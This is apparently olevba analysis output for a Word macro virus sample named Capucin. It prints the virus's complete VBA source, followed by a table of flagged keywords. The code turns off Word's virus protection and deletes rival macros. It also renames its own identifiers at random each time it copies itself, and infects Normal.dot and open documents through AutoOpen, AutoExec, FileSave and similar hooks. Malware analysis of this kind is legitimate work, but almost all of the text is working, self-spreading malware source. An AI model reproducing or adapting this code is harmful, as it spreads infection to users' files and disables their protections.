olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Capucin-37c27dd9dcb7034b2ebeee29e8dd92a5f42c7c41
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Capucin-37c27dd9dcb7034b2ebeee29e8dd92a5f42c7c41 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO E3632SUSJGYN.bas 
in file: Virus.MSWord.Capucin-37c27dd9dcb7034b2ebeee29e8dd92a5f42c7c41 - OLE stream: 'Macros/VBA/E3632SUSJGYN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public QODKQJAGBKSA(1 To 80) As String
Public QODKQJAGBKSA1(1 To 80) As String
Public QODKQJAGBKSA2(1 To 255) As String
Sub MUJBRSYCRXIJWVXB()
'On Error Resume Next
Randomize Timer ' ãåíåðàòîð ñëó÷. ÷èñåë
Dim YTKOKZSVVT As Boolean, XNLJNFCHB As Boolean
 ' ìàññèâ ñòðîê ñ íàçâàíèÿìè
Dim MCYKFQLHTEAE As String
QODKQJAGBKSA(1) = "E3632SUSJGYN": QODKQJAGBKSA(2) = "MUJBRSYCRXIJWVXB"
QODKQJAGBKSA(3) = "QODKQJAGBKSA": QODKQJAGBKSA(4) = "YTKOKZSVVT"
QODKQJAGBKSA(5) = "XNLJNFCHB": QODKQJAGBKSA(6) = "ZCULKTSYHFTKSPQZI"
QODKQJAGBKSA(7) = "DFWDEPOYDTIPI": QODKQJAGBKSA(8) = "FFJGFGKVFBENTJ"
QODKQJAGBKSA(9) = "SITZMNTXXNOPGF": QODKQJAGBKSA(10) = "MCYKFQLHTEAE"
QODKQJAGBKSA(11) = "TJDSTELPQDXBS": QODKQJAGBKSA(12) = "GJIHHZCUNN"
QODKQJAGBKSA(13) = "CADEVKFVUU": QODKQJAGBKSA(14) = "DCNFRKUH"
QODKQJAGBKSA(15) = "PQTHXOIJFIK": QODKQJAGBKSA(16) = "XNFAXYUIAJGQTUTOV"
QODKQJAGBKSA(17) = "VYYEZMNJZX": QODKQJAGBKSA(18) = "VFPEBFTAR"

QODKQJAGBKSA2(1) = "systems": QODKQJAGBKSA2(2) = "MacroBle"
'QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = ""
'QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = ""
'QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = ""


YTKOKZSVVT = False ' ïðèçíàê çàðàæåííîñòè äîêóìåíòà
XNLJNFCHB = False ' ïðèçíàê çàðàæåííîñòè øàáëîíà Normal.dot
Options.ConfirmConversions = False ' îòêëþ÷åíèå çàïðîñà ïðè êîíâåðòàöèè ôàéëà
Options.VirusProtection = False ' îòêëþ÷åíèå âèðóñíîé çàùèòû
Options.SaveNormalPrompt = False ' âêëþ÷åíèå çàïðîñà íà ñîõðàíåíèå øàáëîíà Normal.dot
ActiveDocument.ReadOnlyRecommended = False 'Òåêóùèé äîêóìåíò äëÿ ÷òåíèÿ è çàïèñè

With NormalTemplate.VBProject.VBComponents
 For i = 1 To .Count ' ïðîâåðêà íà íàëè÷èå òåëà âèðóñà â Normal
  If XNFAXYUIAJGQTUTOV(.Item(i).Name) Then
   XNLJNFCHB = True: XNLJNFCHBioner = .Item(i).Name
  Else
   For GJIHHZCUNN = 1 To 255
    If QODKQJAGBKSA2(GJIHHZCUNN) = "" Then Exit For
    If LCase(QODKQJAGBKSA2(GJIHHZCUNN)) = LCase(.Item(i).Name) Then .Item(i).CodeModule.DeleteLines 1, .Item(i).CodeModule.CountOfLines
   Next GJIHHZCUNN
  End If
 Next i
End With

With ActiveDocument.VBProject.VBComponents
 For i = 1 To .Count ' ïðîâåðêà íà íàëè÷èå òåëà âèðóñà â òåêóùåì äîêóìåíòå
  If XNFAXYUIAJGQTUTOV(.Item(i).Name) Then
  YTKOKZSVVT = True: YTKOKZSVVTioner = .Item(i).Name
 Else
   For GJIHHZCUNN = 1 To 255
    If QODKQJAGBKSA2(GJIHHZCUNN) = "" Then Exit For
    If LCase(QODKQJAGBKSA2(GJIHHZCUNN)) = LCase(.Item(i).Name) Then .Item(i).CodeModule.DeleteLines 1, .Item(i).CodeModule.CountOfLines
   Next GJIHHZCUNN
  End If
 Next i
End With

If YTKOKZSVVT = False Then 'åñëè â òåêóùåì äîêóìåíòå íåò àíòèâèðóñà çíà÷èò áóäåò
   NormalTemplate.VBProject.VBComponents(XNLJNFCHBioner).Export XNLJNFCHBioner + ".bas"
   ZCULKTSYHFTKSPQZI = FreeFile
   VFPEBFTAR2
   Open XNLJNFCHBioner + ".bas" For Input As ZCULKTSYHFTKSPQZI
   ZCULKTSYHFTKSPQZI1 = FreeFile
   Open XNLJNFCHBioner + "1.bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE: Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE
    Wend
   Close
   Open XNLJNFCHBioner + "1.bas" For Input As ZCULKTSYHFTKSPQZI
   Open XNLJNFCHBioner + ".bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE:
     MCYKFQLHTEAE = VFPEBFTAR1(MCYKFQLHTEAE)
     Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE
    Wend
   Close
   ActiveDocument.VBProject.VBComponents.Import XNLJNFCHBioner + ".bas"
   Kill XNLJNFCHBioner + ".bas"
   Kill XNLJNFCHBioner + "1.bas"
End If

If XNLJNFCHB = False Then 'åñëè â Normal íåò àíòèâèðóñà çíà÷èò áóäåò
   ActiveDocument.VBProject.VBComponents(YTKOKZSVVTioner).Export YTKOKZSVVTioner + ".bas"
   VFPEBFTAR2
   ZCULKTSYHFTKSPQZI = FreeFile
   Open YTKOKZSVVTioner + ".bas" For Input As ZCULKTSYHFTKSPQZI
   ZCULKTSYHFTKSPQZI1 = FreeFile
   Open YTKOKZSVVTioner + "1.bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE: Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE + Chr(13) + Chr(10);
    Wend
   Close
   
   Open YTKOKZSVVTioner + "1.bas" For Input As ZCULKTSYHFTKSPQZI
   Open YTKOKZSVVTioner + ".bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE:
     MCYKFQLHTEAE = VFPEBFTAR1(MCYKFQLHTEAE)
     Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE
    Wend
   Close ZCULKTSYHFTKSPQZI, ZCULKTSYHFTKSPQZI1
   
   NormalTemplate.VBProject.VBComponents.Import YTKOKZSVVTioner + ".bas"
   Kill YTKOKZSVVTioner + ".bas"
   Kill YTKOKZSVVTioner + "1.bas"
End If

If YTKOKZSVVT = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If XNLJNFCHB = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save

End Sub
Sub FileSave()
 On Error Resume Next
 Call MUJBRSYCRXIJWVXB
End Sub
Sub FileClose()
 On Error Resume Next
 Call MUJBRSYCRXIJWVXB
End Sub
Sub FileOpen()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub AutoOpen()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub AutoClose()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub autonew()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub AutoExec()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Function FFJGFGKVFBENTJ(SITZMNTXXNOPGF As Byte) As String
 Dim MCYKFQLHTEAE As String, TJDSTELPQDXBS As String
 Randomize Timer
 For GJIHHZCUNN = 1 To Int(Rnd(1) * SITZMNTXXNOPGF) + 8
  MCYKFQLHTEAE = Chr(Int(Rnd(1) * 26 + 65))
  TJDSTELPQDXBS = MCYKFQLHTEAE + TJDSTELPQDXBS
 Next GJIHHZCUNN
 FFJGFGKVFBENTJ = TJDSTELPQDXBS
End Function
Function CADEVKFVUU(DCNFRKUH As String) As String
 Dim PQTHXOIJFIK As Long, MCYKFQLHTEAE As String
 If DCNFRKUH <> "" Then
  MCYKFQLHTEAE = UCase(DCNFRKUH)
  For GJIHHZCUNN = 1 To Len(MCYKFQLHTEAE)
   PQTHXOIJFIK = PQTHXOIJFIK + Asc(Mid(MCYKFQLHTEAE, GJIHHZCUNN, 1))
  Next GJIHHZCUNN
  CADEVKFVUU = Left(DCNFRKUH, 1) + LTrim(Str(Len(LTrim(Str(PQTHXOIJFIK))))) + LTrim(Str(PQTHXOIJFIK)) + Right(DCNFRKUH, Len(DCNFRKUH) - 1)
 Else
  CADEVKFVUU = "1"
 End If
 
End Function

Function XNFAXYUIAJGQTUTOV(DCNFRKUH As String) As Boolean
 Dim PQTHXOIJFIK As Long, MCYKFQLHTEAE As String
 On Error Resume Next
 If Len(DCNFRKUH) > 10 Then
  MCYKFQLHTEAE = Left(DCNFRKUH, 1) + _
  Right(DCNFRKUH, Len(DCNFRKUH) - _
  (2 + Len(Mid(DCNFRKUH, 3, CInt(Mid(DCNFRKUH, 2, 1))))))
  If DCNFRKUH = CADEVKFVUU(MCYKFQLHTEAE) Then XNFAXYUIAJGQTUTOV = True Else XNFAXYUIAJGQTUTOV = False
 Else
  XNFAXYUIAJGQTUTOV = False
 End If
End Function
Function VFPEBFTAR1(MCYKFQLHTEAE As String) As String
 Dim PQTHXOIJFIK As Byte, MCYKFQLHTEAE3 As String
 MCYKFQLHTEAE3 = MCYKFQLHTEAE
 PQTHXOIJFIK = 1
 Do While (RTrim(QODKQJAGBKSA(PQTHXOIJFIK)) <> "" And PQTHXOIJFIK < 80)
  If PQTHXOIJFIK < 81 Then PQTHXOIJFIK = PQTHXOIJFIK + 1 Else Exit Do
 Loop
 For GJIHHZCUNN = 1 To PQTHXOIJFIK
  PQTHXOIJFIK1 = InStr(1, MCYKFQLHTEAE3, QODKQJAGBKSA(GJIHHZCUNN))
  Do While (PQTHXOIJFIK1 <> 0 And QODKQJAGBKSA(GJIHHZCUNN) <> "")
   MCYKFQLHTEAE1 = Left(MCYKFQLHTEAE3, PQTHXOIJFIK1 - 1)
   MCYKFQLHTEAE2 = Right(MCYKFQLHTEAE3, Len(MCYKFQLHTEAE3) - Len(MCYKFQLHTEAE1) - Len(QODKQJAGBKSA(GJIHHZCUNN)))
   MCYKFQLHTEAE3 = MCYKFQLHTEAE1 + QODKQJAGBKSA1(GJIHHZCUNN) + MCYKFQLHTEAE2
   PQTHXOIJFIK1 = InStr(1, MCYKFQLHTEAE3, QODKQJAGBKSA(GJIHHZCUNN))
  Loop
 Next GJIHHZCUNN
 VFPEBFTAR1 = MCYKFQLHTEAE3
End Function
Sub VFPEBFTAR2()
 PQTHXOIJFIK = 1
 Do While (RTrim(QODKQJAGBKSA(PQTHXOIJFIK)) <> "" And PQTHXOIJFIK < 80)
  If PQTHXOIJFIK < 81 Then PQTHXOIJFIK = PQTHXOIJFIK + 1 Else Exit Do
 Loop
 QODKQJAGBKSA1(1) = CADEVKFVUU(FFJGFGKVFBENTJ(20))
 For GJIHHZCUNN = 2 To PQTHXOIJFIK
  QODKQJAGBKSA1(GJIHHZCUNN) = FFJGFGKVFBENTJ(10)
 Next GJIHHZCUNN
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
